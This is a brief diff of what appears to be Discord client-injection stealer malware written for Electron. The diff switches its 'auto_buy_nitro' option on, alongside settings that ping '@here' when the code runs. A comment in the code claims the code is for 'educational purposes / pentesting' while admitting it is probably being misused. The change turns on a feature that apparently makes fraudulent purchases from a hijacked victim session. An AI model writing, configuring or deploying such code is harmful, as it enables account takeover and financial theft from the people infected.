@@ -6,7 +6,7 @@ const https = require("https");
 const { BrowserWindow, session } = require("electron");
 
 const config = {
-  auto_buy_nitro: changemeplease,
+  auto_buy_nitro: true,
   ping_on_run: true,
   ping_val: "@here",
   stringspy: "~~stringspy~~", // This code is made for educational purposes / pentesting. if you see this, that was probably not what it was used for. Send me this string at abuse@cynthialabs.net - Thanks
